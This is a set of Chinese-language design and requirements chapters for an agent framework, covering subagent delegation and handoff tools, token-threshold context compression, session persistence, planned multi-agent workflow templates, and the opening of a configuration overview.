    name: "SimpleAgent"
    description: "轻量级Agent,适合快速执行简单任务"
    provider: "local"
    version: "1.0.0"
    factory_path: "simpleAgent.simple_agent:SimpleAgent"

    capabilities:
      - name: "stateless"
        description: "无状态,不保留会话历史"
      - name: "fast"
        description: "快速响应,无需初始化开销"

    skills:
      - name: "quick_analysis"
        description: "快速分析单个文件"
        input_mode: "text"
        output_mode: "markdown"
        examples:
          - "分析uploads/script.py的复杂度"
        parameters:
          file_path: "要分析的文件路径"

    tags: ["lightweight", "stateless", "fast"]
    enabled: true
    available_to_subagent: true
```

**验收标准**:
- ✅ AgentCard包含完整的identity/endpoint/capabilities/skills信息
- ✅ Skills包含examples和parameters便于LLM理解
- ✅ 支持从agents.yaml自动加载AgentCard
- ✅ AgentRegistry提供查询接口(by id/skill/tag)

**参考代码位置**:
- `generalAgent/agents/schema.py` - AgentCard/Skill/Capability定义
- `generalAgent/config/agents.yaml` - Agent配置文件
- `generalAgent/agents/scanner.py` - 自动扫描和加载

---

#### 需求 4:AgentRegistry注册表

**功能描述**:
AgentRegistry负责管理所有Agent的元数据,提供发现、查询、catalog生成功能。

**核心方法**:

**4.1 注册与查询**
```python
class AgentRegistry:
    def register(self, card: AgentCard):
        """注册Agent Card"""

    def get(self, agent_id: str) -> AgentCard:
        """根据ID获取Agent Card"""

    def is_discovered(self, agent_id: str) -> bool:
        """检查Agent是否被发现"""

    def is_enabled(self, agent_id: str) -> bool:
        """检查Agent是否启用"""
```

**4.2 列表查询**
```python
    def list_discovered(self) -> List[AgentCard]:
        """列出所有已发现的agents"""

    def list_enabled(self) -> List[AgentCard]:
        """列出所有启用的agents"""

    def list_by_skill(self, skill_name: str) -> List[AgentCard]:
        """根据skill查询agents"""

    def list_by_tag(self, tag: str) -> List[AgentCard]:
        """根据tag查询agents"""
```

**4.3 Catalog生成**
```python
    def get_catalog_text(self, mode: str = "compact") -> str:
        """生成agents catalog文本

        Args:
            mode: compact(精简) | detailed(详细)

        Returns:
            用于SystemMessage的catalog文本
        """
```

**Catalog格式**:

**Compact模式**(默认,节省tokens):
```markdown
## 可用 Agents

- **simple**: 轻量级Agent,适合快速执行简单任务
- **general**: 完整功能的Agent,支持技能、多轮对话(当前禁用)
```

**Detailed模式**(@mention时显示):
```markdown
## SimpleAgent (@simple)

**能力**:
- stateless: 无状态,不保留会话历史
- fast: 快速响应,无需初始化开销

**技能**:
1. quick_analysis - 快速分析单个文件
   - 示例:"分析uploads/script.py的复杂度"
2. reasoning_task - 使用推理模型解决数学/逻辑问题
   - 示例:"计算fibonacci(100)"
```

**验收标准**:
- ✅ 支持三层架构:discovered → enabled → mentioned
- ✅ Catalog默认精简模式(减少SystemMessage tokens)
- ✅ @mention时动态显示详细技能信息
- ✅ 支持by_skill/by_tag查询

**参考代码位置**:
- `generalAgent/agents/registry.py` - AgentRegistry实现
- `generalAgent/agents/scanner.py:scan_agents_from_config()` - 自动加载

---

#### 需求 5:Handoff Pattern实现

**功能描述**:
为每个enabled agent自动生成`transfer_to_{agent_id}`工具,支持LangGraph的Handoff Pattern。

**自动生成逻辑**:
```python
def generate_handoff_tool(agent_id: str, card: AgentCard) -> BaseTool:
    """为agent生成transfer_to_{agent_id}工具

    示例: transfer_to_simple, transfer_to_general
    """
    @tool
    async def transfer_tool(task: str) -> Command:
        # 调用call_agent
        return await call_agent(agent_id=agent_id, task=task, ...)

    transfer_tool.name = f"transfer_to_{agent_id}"
    transfer_tool.description = f"转交任务给{card.name}: {card.description}"
    return transfer_tool
```

**使用场景**:
1. **用户显式@mention**:
   ```
   User> @simple 分析script.py
   System> [加载SimpleAgent,显示详细技能]
          [生成transfer_to_simple工具]
   LLM> [调用transfer_to_simple("分析script.py...")]
   ```

2. **LLM自主选择**:
   ```
   User> 快速分析一下这段代码
   LLM> [检测到"快速"关键词]
        [选择transfer_to_simple工具]
        [调用SimpleAgent执行]
   ```

**Handoff Flow**:
```
Main Agent → LLM决策 → transfer_to_{agent_id}
                      ↓
                  call_agent()
                      ↓
                  Target Agent执行
                      ↓
                  返回Command(update state)
                      ↓
                  Main Agent继续
```

**验收标准**:
- ✅ 每个enabled agent自动生成transfer_to工具
- ✅ @mention时动态加载transfer_to工具
- ✅ 工具描述包含agent的能力和技能
- ✅ 返回Command对象更新父状态

**参考代码位置**:
- `generalAgent/agents/handoff_tools.py` - generate_handoff_tool()
- `generalAgent/graph/nodes/planner.py:150-180` - 动态加载handoff工具

---

#### 需求 6:上下文隔离与继承

**功能描述**:
Subagent拥有独立context_id,与父Agent隔离,但可以选择性继承工具、技能、工作区。

**隔离机制**:

**AppState.context_id字段**:
- 主Agent: `context_id = "main"`
- Subagent: `context_id = "subagent-{uuid[:8]}"`
- 用于区分不同执行上下文

**AppState.parent_context字段**:
- Subagent记录父Agent的context_id
- 用于追踪调用链: main → subagent-abc → subagent-xyz

**继承规则**:

**delegate_task继承**(同类型):
```python
delegated_state = {
    "context_id": "subagent-abc123",
    "parent_context": parent_state.get("context_id", "main"),

    # ✅ 继承
    "mentioned_agents": list(parent_mentioned_agents),
    "active_skill": parent_active_skill,
    "workspace_path": parent_workspace,
    "uploaded_files": list(parent_uploaded_files),

    # ❌ 独立
    "messages": [HumanMessage(task)],  # 独立对话历史
    "todos": [],                        # 独立任务列表
    "loops": 0,                         # 独立循环计数
}
```

**call_agent继承**(跨类型):
- SimpleAgent: 不继承(无状态,每次全新创建)
- GeneralAgent: 可选继承(通过参数控制)

**验收标准**:
- ✅ Subagent看不到主对话历史(messages独立)
- ✅ Subagent可以使用主Agent的工具(@mentioned)
- ✅ Subagent可以访问主Agent的工作区
- ✅ 支持context_id追踪调用链

**参考代码位置**:
- `generalAgent/graph/state.py:40-42` - context_id/parent_context定义
- `generalAgent/tools/builtin/delegate_task.py:106-125` - 继承逻辑
- `generalAgent/tools/builtin/delegate_task.py:29-35` - 父状态存储

---

#### 需求 7:流式输出与进度可见

**功能描述**:
Subagent执行过程实时流式输出,用户可以看到进度和中间结果。

**实现方式**:

**delegate_task流式输出**:
```python
# 使用astream实时获取状态快照
async for state_snapshot in app_graph.astream(
    delegated_state,
    config=config,
    stream_mode="values"
):
    final_state = state_snapshot

    # 打印新消息
    current_messages = state_snapshot.get("messages", [])
    for idx in range(message_count, len(current_messages)):
        msg = current_messages[idx]
        if hasattr(msg, "content"):
            content = str(msg.content)
            print(f"[subagent] {content[:200]}...")
```

**输出示例**:
```
[subagent-abc123] Starting execution...
[subagent] Loop 1: 正在搜索Python 3.13文档...
[subagent] Loop 2: 找到15个新特性
[subagent] Loop 3: 正在分析PEP提案...
[subagent] Loop 4: 生成对比表格...
[subagent] Completed in 4 loops
```

**call_agent输出**:
- SimpleAgent: 单次输出(无loop)
- GeneralAgent: 支持流式输出(如果实现)

**验收标准**:
- ✅ Subagent每条消息实时打印
- ✅ 显示context_id便于追踪
- ✅ 显示loop计数和完成状态
- ✅ 长内容自动截断(前200字符)

**参考代码位置**:
- `generalAgent/tools/builtin/delegate_task.py:136-165` - 流式输出实现
- `generalAgent/cli.py:180-250` - CLI流式输出集成

---

### 参考代码位置

| 功能模块 | 文件路径 | 说明 |
|---------|---------|------|
| delegate_task工具 | `generalAgent/tools/builtin/delegate_task.py` | 同类型副本委派 |
| call_agent工具 | `generalAgent/tools/builtin/call_agent.py` | 跨类型agent调用 |
| AgentCard定义 | `generalAgent/agents/schema.py` | A2A Protocol标准 |
| AgentRegistry | `generalAgent/agents/registry.py` | Agent注册表 |
| Agent扫描器 | `generalAgent/agents/scanner.py` | 自动加载agents.yaml |
| Handoff工具生成 | `generalAgent/agents/handoff_tools.py` | transfer_to_{agent_id} |
| Agent配置 | `generalAgent/config/agents.yaml` | Agent Card配置 |
| SimpleAgent实现 | `simpleAgent/simple_agent.py` | SimpleAgent核心逻辑 |
| SimpleAgent Graph | `simpleAgent/graph/builder.py` | SimpleAgent LangGraph |
| Planner父状态存储 | `generalAgent/graph/nodes/planner.py:360-376` | set_parent_state() |
| AppState定义 | `generalAgent/graph/state.py:40-42` | context_id/parent_context |
| CLI流式输出 | `generalAgent/cli.py:180-250` | Subagent输出集成 |

---

**参见其他章节**:
- 三、Agent 模板系统 - SimpleAgent和GeneralAgent详细定义
- 一、工具系统 - 工具继承和available_to_subagent机制
- 四、Agent 流程与状态管理 - AppState结构和context_id隔离

---

# 6. 上下文管理

### 产品定位

上下文管理是框架的智能优化层,负责监控 Token 使用、自动压缩历史、管理会话持久化。通过三级阈值监控(75%/85%/95%)和 LLM 压缩策略,在不中断对话的情况下释放 Token 空间,降低API成本60-80%,同时保证对话语义完整性。

**价值主张**:
- **成本优化**:KV Cache 优化降低60-80%推理成本,自动压缩减少 Token 消耗
- **用户无感**:压缩过程静默执行,无通知打扰,对话体验连续
- **智能平衡**:LLM 压缩保留语义,紧急截断保证可靠性
- **会话持久化**:SQLite 存储支持断点续聊,恢复时间<500ms

---

### 核心场景

#### 场景 1:长对话自动优化

**用户故事**:
用户与Agent进行300轮对话(~120K tokens),系统需要在不中断对话的情况下释放Token空间。

**系统行为**:
1. Planner节点检测Token使用率达到95%
2. 自动路由到Summarization节点
3. LLM将前290条消息压缩为1条摘要
4. 保留最近10条消息
5. 返回Planner节点继续执行

**关键点**:
- 用户无感知(无压缩通知)
- 压缩比高达95%
- 对话语义完整保留

---

#### 场景 2:会话断点续聊

**用户故事**:
用户在办公室与Agent讨论项目需求(50轮对话),关闭应用后回家继续讨论,系统需要完整恢复上下文。

**系统行为**:
1. 用户使用`/sessions`命令查看历史会话
2. 选择会话ID: `abc123`
3. 使用`/load abc123`加载会话
4. 系统从SQLite恢复:消息历史、工具状态、技能、工作区路径
5. 用户继续提问,Agent理解之前的上下文

**关键点**:
- 恢复时间<500ms
- 100%状态恢复
- 支持1000+并发会话

---

#### 场景 3:KV Cache成本优化

**用户故事**:
开发团队使用Agent处理100轮对话,传统方案每轮都重新计算System Prompt(5K tokens),消耗大量推理成本。

**系统行为**:
1. 系统启动时生成固定SystemMessage(分钟级时间戳)
2. 整个会话期间SystemMessage不变
3. 动态提醒追加到最后一条Human Message
4. KV Cache复用率达70-90%

**成本对比**:
- 传统方案:100轮 × 5K tokens = 500K tokens
- 优化后:5K + 95轮 × 0.5K = 52.5K tokens
- **成本降低90%**

---

### 功能需求

#### 需求1:Token监控与三级阈值

**需求描述**:
实现Token使用率监控,根据三级阈值(info/warning/critical)触发不同响应策略。

**阈值定义**:

| 级别 | 阈值 | 行为 | 日志级别 |
|------|------|------|---------|
| normal | <75% | 正常执行 | INFO |
| info | 75%-85% | 记录信息,动态加载compact_context工具 | INFO |
| warning | 85%-95% | 警告,添加Token提醒到消息 | WARNING |
| critical | >95% | 跳过LLM调用,触发自动压缩 | WARNING |

**监控逻辑**:

```python
# generalAgent/context/token_tracker.py
class TokenTracker:
    def check_status(
        self,
        cumulative_prompt_tokens: int,
        model_id: str
    ) -> ContextStatus:
        context_window = self.get_context_window(model_id)
        usage_ratio = cumulative_prompt_tokens / context_window

        if usage_ratio >= self.settings.critical_threshold:
            return ContextStatus(
                level="critical",
                usage_ratio=usage_ratio,
                message="⚠️ Token使用率>95%,触发自动压缩"
            )
        elif usage_ratio >= self.settings.warning_threshold:
            return ContextStatus(
                level="warning",
                usage_ratio=usage_ratio,
                message=f"⚠️ Token使用率: {usage_ratio:.1%}"
            )
        # ... 其他级别
```

**配置参数**(.env):

```bash
CONTEXT_INFO_THRESHOLD=0.75        # 75% 信息提示
CONTEXT_WARNING_THRESHOLD=0.85     # 85% 警告
CONTEXT_CRITICAL_THRESHOLD=0.95    # 95% 强制压缩
```

**验收标准**:
- ✅ 支持三级阈值配置(0.6-0.99)
- ✅ 实时计算usage_ratio
- ✅ 根据阈值返回正确的ContextStatus
- ✅ 记录完整的Token追踪日志

**实现参考**:`generalAgent/context/token_tracker.py`

---

#### 需求2:自动上下文压缩

**需求描述**:
Token使用率>95%时自动触发LLM压缩,将旧消息总结为摘要,保留最近对话。

**压缩策略**:

| 策略 | 触发条件 | 保留内容 | 压缩方式 |
|------|---------|---------|---------|
| LLM压缩 | 首选 | 最近15% context window的消息 | LLM总结摘要 |
| 紧急截断 | LLM压缩失败 | 最近100条消息 | 直接删除旧消息 |

**保留消息计算**(混合策略):

```python
# 策略1: 基于Token比例
keep_tokens = context_window * keep_recent_ratio  # 默认15%
keep_message_count = estimate_messages_by_tokens(keep_tokens)

# 策略2: 基于消息数量
keep_message_count = max(keep_recent_messages, keep_message_count)  # 至少10条

# 最终: 两者中先达到的
recent_messages = messages[-keep_message_count:]
```

**LLM压缩流程**:

```
1. 确定保留消息数量(keep_recent_ratio=15% 或 keep_recent_messages=10)
2. 分离消息:
   - to_compress: messages[:-keep_count]
   - recent: messages[-keep_count:]
3. 调用LLM压缩:
   - 提示词:"请总结以下对话内容,保留关键信息、决策、上下文"
   - 输入: to_compress
   - 输出: 压缩摘要(AIMessage)
4. 重组消息:
   - [SystemMessage, 压缩摘要, *recent_messages]
5. 重置Token计数器
```

**压缩示例**:

```
压缩前: 302条消息(123K tokens)
  - SystemMessage(1条)
  - 对话历史(301条): 用户需求讨论、代码实现、测试、调试...

压缩后: 13条消息(6.5K tokens, 压缩比95%)
  - SystemMessage(1条)
  - 压缩摘要(1条): "用户要求实现XX功能,讨论了ABC方案,最终选择..."
  - 最近对话(11条): 保留完整上下文
```

**验收标准**:
- ✅ Token使用率>95%时自动触发
- ✅ 保留最近15% context window的消息(或至少10条)
- ✅ LLM压缩失败时回退到紧急截断
- ✅ 用户无感知(无通知消息)
- ✅ 压缩后正确重置Token计数器

**实现参考**:`generalAgent/context/compressor.py`、`generalAgent/graph/nodes/summarization.py`

---

#### 需求3:会话持久化

**需求描述**:
支持会话状态的保存和恢复,使用SQLite Checkpointer存储完整对话历史。

**存储内容**:

```python
# 每个会话存储的状态
{
    "thread_id": "abc123",
    "messages": [...],  # 消息历史
    "mentioned_agents": [...],  # @mention记录
    "active_skill": "pdf",
    "workspace_path": "/data/workspace/abc123",
    "uploaded_files": [...],
    "todos": [...],
    "compact_count": 2,  # 压缩次数
    "cumulative_prompt_tokens": 45000,
    "last_updated": "2025-10-31T12:34:56Z"
}
```

**CLI命令**:

| 命令 | 功能 | 示例 |
|------|------|------|
| `/sessions` | 列出所有会话 | 显示ID、创建时间、消息数 |
| `/load <id>` | 加载会话 | `/load abc` (支持前缀匹配) |
| `/reset` | 重置当前会话 | 清空历史,重新开始 |
| `/current` | 显示当前会话信息 | 显示thread_id、消息数、Token使用 |

**会话列表示例**:

```
=== 历史会话 ===

1. abc123  (2025-10-30 14:23)
   - 消息数: 45
   - 最后活动: 1天前
   - 技能: pdf, docx

2. def456  (2025-10-31 09:15)
   - 消息数: 120
   - 最后活动: 3小时前
   - 压缩次数: 2

使用 /load <id> 恢复会话
```

**验收标准**:
- ✅ 会话状态100%恢复(消息、工具、技能)
- ✅ 支持至少1000个并发会话
- ✅ 恢复时间<500ms
- ✅ 支持前缀匹配加载(`/load abc`)
- ✅ 自动保存(每轮对话后)

**实现参考**:`shared/session/store.py`、`shared/session/manager.py`

---

#### 需求4:消息历史清理

**需求描述**:
自动清理无效消息,确保OpenAI API兼容性,避免因未响应的tool_calls导致错误。

**清理规则**:

```python
# 移除未被响应的tool_calls
def clean_message_history(messages):
    # 1. 收集所有ToolMessage.tool_call_id
    answered_calls = {
        msg.tool_call_id
        for msg in messages
        if isinstance(msg, ToolMessage)
    }

    # 2. 遍历AIMessage,检查tool_calls是否有响应
    cleaned = []
    for msg in messages:
        if isinstance(msg, AIMessage) and msg.tool_calls:
            # 检查是否所有tool_calls都有响应
            unanswered = [
                tc for tc in msg.tool_calls
                if tc["id"] not in answered_calls
            ]

            if unanswered:
                continue  # 跳过这条AIMessage

        cleaned.append(msg)

    return cleaned
```

**安全截断策略**:

```python
# 保留AIMessage-ToolMessage对
def truncate_messages_safely(messages, keep_recent=40):
    # 1. 识别tool_call对
    tool_call_pairs = {}  # tool_call_id -> (ai_idx, tool_idx)

    # 2. 确定保留范围
    cutoff_idx = len(messages) - keep_recent

    # 3. 如果保留ToolMessage,必须保留对应的AIMessage
    must_keep = set(range(cutoff_idx, len(messages)))

    for i in range(cutoff_idx, len(messages)):
        if isinstance(messages[i], ToolMessage):
            call_id = messages[i].tool_call_id
            if call_id in tool_call_pairs:
                ai_idx = tool_call_pairs[call_id]["ai_idx"]
                must_keep.add(ai_idx)

    # 4. 构建结果
    return [messages[i] for i in sorted(must_keep)]
```

**验收标准**:
- ✅ 清理未响应的tool_calls(避免OpenAI API错误)
- ✅ 截断时保留AIMessage-ToolMessage对
- ✅ 始终保留SystemMessage
- ✅ 可配置截断阈值(MAX_MESSAGE_HISTORY)

**实现参考**:`generalAgent/graph/message_utils.py`

---

#### 需求5:KV Cache优化

**需求描述**:
优化SystemMessage和提醒机制,最大化KV Cache复用率,降低推理成本60-80%。

**优化策略**:

| 优化点 | 方法 | 效果 |
|--------|------|------|
| 固定SystemMessage | 启动时生成一次,包含分钟级时间戳 | 70-90% KV Cache复用 |
| 动态提醒后置 | 追加到最后一条HumanMessage | 提高Cache命中率 |
| 时间戳精度降级 | 分钟级(HH:MM)而非秒级 | 同一分钟内100%复用 |

**SystemMessage结构**:

```python
# 启动时生成一次,整个会话期间不变
static_system_prompt = f"""
{PLANNER_SYSTEM_PROMPT}  # 固定指令

{skills_catalog}  # 启用的技能列表(静态)

{agents_catalog}  # 启用的Agent列表(静态)

<current_datetime>{now.strftime('%Y-%m-%d %H:%M UTC')}</current_datetime>
"""
```

**动态提醒追加**:

```python
# 错误做法(修改SystemMessage,破坏Cache)
system_message.content += "\n\n<reminder>...</reminder>"  # ❌

# 正确做法(追加到最后一条HumanMessage)
last_human_message.content += "\n\n<system_reminder>...</system_reminder>"  # ✅
```

**成本对比**:

| 场景 | 传统方式 | 优化后 | 成本降低 |
|------|---------|--------|---------|
| 短对话(10轮) | 100%全量计算 | 90% KV Cache复用 | 60% |
| 长对话(100轮) | 100%全量计算 | 70% KV Cache复用 | 80% |

**验收标准**:
- ✅ SystemMessage在会话期间固定不变
- ✅ 时间戳精度为分钟级(HH:MM UTC)
- ✅ 动态提醒追加到最后一条HumanMessage
- ✅ 多轮对话中KV Cache复用率≥70%

**实现参考**:`generalAgent/graph/nodes/planner.py:86-107`

---

### 非功能需求

#### 性能需求

| 指标 | 目标值 | 测量方法 |
|------|--------|---------|
| Token追踪开销 | <10ms | extract_token_usage()耗时 |
| 压缩耗时 | <10s | LLM压缩时间 |
| 会话恢复 | <500ms | SQLite加载时间 |
| KV Cache复用率 | ≥70% | 多轮对话测试 |

#### 可靠性需求

| 需求 | 说明 | 验收标准 |
|------|------|----------|
| 压缩降级策略 | LLM压缩失败时回退截断 | 异常注入测试 |
| 会话持久化 | SQLite写入失败时继续运行 | 容错测试 |
| Token计数准确性 | cumulative_prompt_tokens误差<5% | 对比API返回值 |

#### 可用性需求

| 需求 | 说明 | 验收标准 |
|------|------|----------|
| 压缩无感知 | 不显示压缩通知 | 用户体验测试 |
| 会话列表清晰 | 显示ID、时间、消息数 | UI评审 |
| 配置易读性 | .env注释完整 | 开发者5分钟上手 |

---

### 参考代码位置

| 功能模块 | 代码路径 |
|---------|---------|
| 上下文管理器 | `generalAgent/context/manager.py` |
| Token追踪器 | `generalAgent/context/token_tracker.py` |
| 上下文压缩器 | `generalAgent/context/compressor.py` |
| 消息截断器 | `generalAgent/context/truncator.py` |
| 消息清理工具 | `generalAgent/graph/message_utils.py` |
| Summarization节点 | `generalAgent/graph/nodes/summarization.py` |
| 会话存储 | `shared/session/store.py` |
| 会话管理器 | `shared/session/manager.py` |
| 配置参数 | `generalAgent/config/settings.py:ContextManagementSettings` |

---


# Workflow 模板 (计划中)

## 产品定位

Workflow模板系统是框架的**高级编排能力**,提供预定义的多Agent协作模式,帮助开发者快速构建复杂的AI工作流。基于现有的`delegate_task`和`call_agent`能力,Workflow模板将常见协作模式标准化、可配置化。

**核心理念**:
- 🔧 **开箱即用** - 预定义的协作模式,无需从零设计
- 🎯 **场景驱动** - 针对常见业务场景优化
- 🔌 **可组合** - 模板可嵌套和组合使用
- 📊 **可观测** - 内置进度追踪和状态管理

---

## 三种核心模式

### 模式 1: Pipeline 模式 (流水线)

**适用场景**:
- 多步骤顺序处理(数据ETL、文档处理流程)
- 每步输出是下一步输入
- 需要阶段性结果验证

**工作原理**:
```
Agent A (数据采集)
  → 输出: raw_data.json

Agent B (数据清洗)
  → 输入: raw_data.json
  → 输出: cleaned_data.json

Agent C (数据分析)
  → 输入: cleaned_data.json
  → 输出: report.pdf
```

**典型用例**:
- 📄 文档处理流水线: PDF提取 → 内容分析 → 报告生成
- 📊 数据处理流水线: 爬取数据 → 清洗 → 分析 → 可视化
- 🔍 研究工作流: 搜索资料 → 总结要点 → 撰写报告

**实现方式**:
```python
# 基于 delegate_task 实现
result_a = delegate_task("采集数据...")
result_b = delegate_task(f"清洗数据: {result_a}")
result_c = delegate_task(f"分析数据: {result_b}")
```

---

### 模式 2: Parallel 模式 (并行)

**适用场景**:
- 独立子任务可并行执行
- 需要汇总多个来源的结果
- 加速整体执行时间

**工作原理**:
```
                ┌─→ Agent A (搜索技术文档) ─┐
                │                           │
Main Agent ─────┼─→ Agent B (搜索学术论文) ─┼─→ Aggregator → 综合报告
                │                           │
                └─→ Agent C (搜索实践案例) ─┘

(并行执行, 互不依赖)
```

**典型用例**:
- 🔍 多源信息聚合: 同时搜索文档、论文、代码、案例
- 🌐 多语言翻译: 同时翻译成多种语言
- 📊 多维度分析: 同时分析技术、成本、风险

**实现方式**:
```python
# 基于 delegate_task 并发实现 (计划中)
tasks = [
    delegate_task("搜索技术文档"),
    delegate_task("搜索学术论文"),
    delegate_task("搜索实践案例")
]
results = await asyncio.gather(*tasks)  # 并行执行
final = aggregate(results)
```

---

### 模式 3: Hierarchical 模式 (层级)

**适用场景**:
- 复杂任务需要分解和委派
- 有主管-员工的层级关系
- 需要动态任务分配

**工作原理**:
```
Manager Agent (项目经理)
  ├─ 分解任务
  ├─ 分配给Worker Agents
  ├─ 监控进度
  └─ 汇总结果

     ├─→ Worker A (前端开发)
     ├─→ Worker B (后端开发)
     └─→ Worker C (测试)
```

**典型用例**:
- 🏗️ 项目管理: 经理分配任务给团队成员
- 📝 内容创作: 主编分配章节给作者
- 🔬 研究项目: PI分配研究任务给研究员

**实现方式**:
```python
# 基于 delegate_task 实现
class ManagerAgent:
    def execute(self, task):
        # 1. 分解任务
        subtasks = self.decompose(task)

        # 2. 委派给Worker Agents
        results = []
        for subtask in subtasks:
            result = delegate_task(subtask)
            results.append(result)

        # 3. 汇总结果
        return self.aggregate(results)
```

---

## 通用能力

### 1. 状态传递

**能力**: 在Agent之间传递上下文和状态

**机制**:
- 文件传递: 通过workspace共享文件
- 参数传递: 通过task_description传递关键信息
- 状态存储: 通过workspace/outputs/保存中间结果

**示例**:
```python
# Agent A 生成结果
write_file("outputs/step1_result.json", result)

# Agent B 读取结果
delegate_task("读取 outputs/step1_result.json 并继续处理")
```

---

### 2. 错误处理

**能力**: 处理Workflow执行中的异常

**策略**:
- ✅ **自动重试**: Worker失败时自动重试(最多N次)
- ✅ **降级处理**: 关键步骤失败时使用备用方案
- ✅ **部分成功**: Parallel模式下允许部分任务失败
- ✅ **错误上报**: 将错误信息汇总给Manager

**示例**:
```python
try:
    result = delegate_task(subtask)
except Exception as e:
    # 重试或降级
    result = fallback_method(subtask)
```

---

### 3. 进度追踪

**能力**: 实时监控Workflow执行进度

**机制**:
- 📊 TODO列表: 每个Agent维护自己的任务列表
- 📈 进度百分比: Manager统计完成/总任务数
- 🔔 里程碑通知: 关键步骤完成时通知用户

**示例**:
```python
# Manager Agent追踪进度
total = len(subtasks)
completed = 0

for subtask in subtasks:
    result = delegate_task(subtask)
    completed += 1
    progress = f"{completed}/{total} ({completed/total*100:.0f}%)"
    print(f"进度: {progress}")
```

---

## 配置化设计 (计划)

### Workflow配置文件

```yaml
# workflows/document_processing.yaml
name: "文档处理流水线"
description: "PDF提取 → 分析 → 报告生成"
mode: pipeline

steps:
  - name: extract
    agent: GeneralAgent
    task: "提取PDF内容"
    skills: ["@pdf"]
    output: "outputs/extracted.txt"

  - name: analyze
    agent: GeneralAgent
    task: "分析提取的内容"
    input: "outputs/extracted.txt"
    output: "outputs/analysis.json"

  - name: report
    agent: GeneralAgent
    task: "生成分析报告"
    input: "outputs/analysis.json"
    output: "outputs/report.md"

error_handling:
  retry_count: 2
  fallback: "通知用户失败原因"
```

---

## 实现路线图 (计划)

### Phase 1: 基础支持 (当前)
- ✅ `delegate_task` - 支持Pipeline和Hierarchical模式
- ✅ `call_agent` - 支持跨Agent类型调用
- ✅ 工作区共享 - 通过workspace传递文件

### Phase 2: 并行支持 (v4.0)
- 🔄 并发执行 - 支持多个delegate_task并行
- 🔄 结果聚合 - 自动收集并行任务结果
- 🔄 超时控制 - 设置并行任务的超时时间

### Phase 3: Workflow DSL (v4.5)
- 📋 YAML配置 - 通过配置文件定义Workflow
- 📋 可视化编辑器 - 拖拽式Workflow设计
- 📋 模板市场 - 共享和复用Workflow模板

### Phase 4: 高级特性 (v5.0)
- 🚀 条件分支 - 根据结果选择不同路径
- 🚀 循环执行 - 支持迭代式任务
- 🚀 人工干预点 - 在关键步骤暂停等待审批
- 🚀 性能优化 - 智能调度和资源管理

---

## 参考实现

### 现有能力基础

**当前可用**:
- `generalAgent/tools/builtin/delegate_task.py` - Subagent委派
- `generalAgent/tools/builtin/call_agent.py` - 跨Agent调用
- `generalAgent/persistence/workspace.py` - 工作区管理
- `generalAgent/tools/builtin/todo_write.py` - 进度追踪

**参考案例**:
- 多Agent协作章节: docs/桌面 AI 框架需求.md:2115-2230
- 产品架构 - 多Agent流程: docs/桌面 AI 框架需求.md:908-938

---

## 使用示例 (概念)

### Pipeline示例

```python
# 文档处理流水线
async def document_processing_workflow(pdf_path: str):
    # Step 1: 提取内容
    extraction = await delegate_task(
        f"提取 {pdf_path} 的所有文本内容,保存到 outputs/extracted.txt"
    )

    # Step 2: 分析内容
    analysis = await delegate_task(
        "读取 outputs/extracted.txt,分析主题和关键信息,保存到 outputs/analysis.json"
    )

    # Step 3: 生成报告
    report = await delegate_task(
        "读取 outputs/analysis.json,生成markdown格式的分析报告,保存到 outputs/report.md"
    )

    return report
```

### Parallel示例

```python
# 多源信息聚合
async def multi_source_research(topic: str):
    # 并行搜索多个来源
    tasks = [
        delegate_task(f"@search_web 搜索关于'{topic}'的技术文档"),
        delegate_task(f"@search_web 搜索关于'{topic}'的学术论文"),
        delegate_task(f"搜索GitHub上关于'{topic}'的热门项目")
    ]

    # 等待所有任务完成
    results = await asyncio.gather(*tasks)

    # 汇总结果
    summary = await delegate_task(
        f"综合以下信息,生成关于'{topic}'的全面报告:\n" +
        "\n---\n".join(results)
    )

    return summary
```

### Hierarchical示例

```python
# 项目管理
async def project_manager_workflow(project_desc: str):
    # Manager分解任务
    decomposition = await delegate_task(
        f"作为项目经理,将以下项目分解为3-5个子任务:\n{project_desc}"
    )

    # 解析子任务
    subtasks = parse_subtasks(decomposition)

    # 分配给Worker Agents
    results = []
    for i, subtask in enumerate(subtasks, 1):
        result = await delegate_task(
            f"[Worker {i}] {subtask['description']}"
        )
        results.append(result)

    # Manager汇总结果
    final_report = await delegate_task(
        f"作为项目经理,汇总以下工作成果:\n" +
        "\n".join([f"- {r}" for r in results])
    )

    return final_report
```

---

## 总结

Workflow模板系统是AgentGraph框架的**高级编排能力**,基于现有的多Agent协作基础(delegate_task/call_agent),将常见协作模式标准化。

**当前状态**:
- ✅ 基础能力就绪(Pipeline/Hierarchical可用)
- 🔄 高级特性计划中(Parallel/配置化/可视化)

**预计发布**:
- v4.0 (并行支持)
- v4.5 (配置化DSL)
- v5.0 (高级特性)

**参考资料**:
- 多Agent协作章节: 第2115-2230行
- 产品架构 - 多Agent流程: 第908-938行

---

*本章节描述的是计划中的功能,具体实现可能根据开发进度调整*
# generalAgent/config 配置系统总结

## 概述

`generalAgent/config/` 目录包含8个配置文件，构成了 AgentGraph 框架的完整配置系统。配置采用 **Pydantic BaseSettings** (Python) 和 **YAML** (声明式) 混合架构，自动从 `.env` 文件加载环境变量。

---

## 配置文件清单

| 文件名 | 类型 | 行数 | 用途 |
|--------|------|------|------|
| `settings.py` | Python | 382 | 环境变量配置（.env → Pydantic） |
| `tools.yaml` | YAML | 144 | 工具可用性和分类 |
| `skills.yaml` | YAML | 50 | 技能加载和文件类型映射 |
| `agents.yaml` | YAML | 217 | Agent Card 定义（A2A协议） |
| `hitl_rules.yaml` | YAML | 128 | HITL审批规则 |
| `project_root.py` | Python | 56 | 项目路径解析工具 |
| `skill_config_loader.py` | Python | 152 | Skills YAML加载器 |
| `__init__.py` | Python | 6 | 模块导出 |

---

## 1. settings.py - 环境变量配置（382行）

### 架构设计

使用 **Pydantic BaseSettings** 实现自动环境变量加载：

```python
Settings (根设置)
├── ModelRoutingSettings      # 5个模型槽位配置
├── GovernanceSettings        # 运行时治理规则
├── ObservabilitySettings     # 可观测性（日志/追踪）
├── ContextManagementSettings # 上下文压缩配置
└── DocumentSettings          # 文档处理参数
```

### 1.1 ModelRoutingSettings - 模型路由配置

**用途**: 配置5个模型槽位（base/reason/vision/code/chat），支持多提供商

**配置参数** (每个模型槽位包含)：
```bash
# 模型标识
MODEL_BASE_ID=deepseek-chat
MODEL_BASE_API_KEY=sk-xxx
MODEL_BASE_BASE_URL=https://api.deepseek.com

# 上下文窗口和输出限制
MODEL_BASE_CONTEXT_WINDOW=128000      # 上下文窗口大小（tokens）
MODEL_BASE_MAX_COMPLETION_TOKENS=2048 # 最大输出长度（tokens）
```

**5个模型槽位**:
1. **base** (基础模型) - 常规对话和规划
